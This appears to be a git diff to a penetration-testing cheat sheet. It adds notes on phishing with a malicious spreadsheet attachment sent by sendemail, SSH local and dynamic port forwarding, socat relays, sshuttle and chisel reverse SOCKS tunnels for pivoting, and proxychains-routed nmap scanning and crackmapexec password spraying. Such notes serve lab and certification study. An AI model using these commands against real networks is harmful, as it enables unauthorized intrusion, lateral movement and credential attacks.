@@ -232,8 +232,9 @@ With this, impacket will try to relay our hash to other machine with ip is `serv
 
 ### Macro attacks:
 
-[Libreoffice](https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html)
-[Libreoffice](https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html)
+[Libreoffice Calc Macro](https://jamesonhacking.blogspot.com/2022/03/using-malicious-libreoffice-calc-macros.html)
+
+[Libreoffice Remote Code](https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html)
 
 ### Mail Server
 
@@ -304,6 +305,18 @@ sudo swaks -t username1@mailserver.com -t user2@mailserver.com --from john@mails
 ```
 You will be asked for a login. Enter the credentials founded and send the e-mail. Now just wait for your reverse shell
 
+
+Using sendmail:
+```
+sendemail -f 'user@localhost' \
+                       -t 'admin@localhost' \
+                       -s $rhosts:25 \
+                       -u 'Your spreadsheet' \
+                       -m 'Here is your requested document' \
+                       -a document.ext
+
+```
+
 ## Pivoting
 
 kali ---> MACHINE1 (WAN) ---> MACHINE2(local network)
@@ -330,7 +343,7 @@ ssh user@IP_MACHINE1 -p2222
 
 ### SSH Local Port Forwarding
 
-kali ---> MACHINE1 (DMZ) ---> MACHINE2 ---> MACHINE3 (local network/shares)
+kali ---> MACHINE1 (DMZ) ---> MACHINE2 ---> MACHINE3 (local network/shares) (I will make this image)
 
 Option `-L` is for local port forward, `-N` is to prevent a shell from being opened, the first IPADDRESS:PORT is for listening, the second IPADDRESS:PORT is to where we want to forward the packets.
 We are going to use it in machine1, because it will make our tunnel work and we have access with MACHINE2.
@@ -340,16 +353,50 @@ ssh -N -L 0.0.0.0:4455:IP_MACHINE3:445 user_machine2@$IP_MACHINE2
 
 In kali machine, we can access the remote share:
 ```
-smbclient -p 4455 -L //IP_MACHINE1/
+smbclient -p 4455 -L //IP_MACHINE1/ -U username -P password
 ```
 
 ### SSH Dynamic Port Forwarding
 
+kali ---> MACHINE1 (DMZ) ---> MACHINE2 ---> MACHINE3,4,5,6... (local network/shares) (I will make this image)
+
+Listening 0.0.0.0 on port 9999 (MACHINE1), forward all in port 999 using the ssh access to MACHINE2 in order to access MACHINES3,4,5,...
+```
+ssh -N -D 0.0.0.0:9999 user_machine2@$IP_MACHINE2
+```
+
+Your proxychains4.conf should be (use tail to check):
+```
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks5 IP_MACHINE1 9999
+```
+
+Using a command:
+
+```
+proxychains smbclient -L //IP_MACHINE3/
+```
+
 ### SSH Remote Port Forwarding
+
+With Firewall!
 
 ### SSH Remote Dynamic Port Forwarding
 
 ### sshutle
+
+If needed, we can make a tunnel from MACHINE1 in order to forward all traffic from another networks, in this example we can use socat for that. In MACHINE1:
+```
+socat TCP-LISTEN:2222,fork TCP:IP_MACHINE2:22
+```
+
+From Kali:
+```
+sshuttle -r username@IP_MACHINE3:2222 NETWORK1/24 NETWORK2/24
+```
 
 ### PLink
 
@@ -358,3 +405,35 @@ smbclient -p 4455 -L //IP_MACHINE1/
 ### ssh.exe
 
 ### Chisel (very important!)
+
+#### Local machine:
+Your local server:
+```
+chisel server --port LPORT --reverse
+```
+NOTE: chisel can accept more than one connection.
+NOTE2: remember to use the SAME version in both sides!
+
+#### Remote machine:
+Dynamic type:
+```
+chisel client --max-retry-count 3 SERVER_IP:SERVER_LPORT R:socks
+```
+
+For an specific port:
+```
+chisel client --max-retry-count 3 SERVER_IP:SERVER_LPORT RED_LPORT:IP:RED_PORT
+```
+NOTE: I prefer using `--max-retry-count` with 3 because it will release after some retries and you don't lose your shell.
+
+### Some Commands with proxychains
+
+nmap:
+```
+proxychains nmap -vvv -sT --top-ports=20 -Pn $remote_ip
+```
+
+Password spraying:
+```
+proxychains crackmapexec smb $remote_ip -u users.list -p 'password123!' -d domain.com --continue-on-success
+```
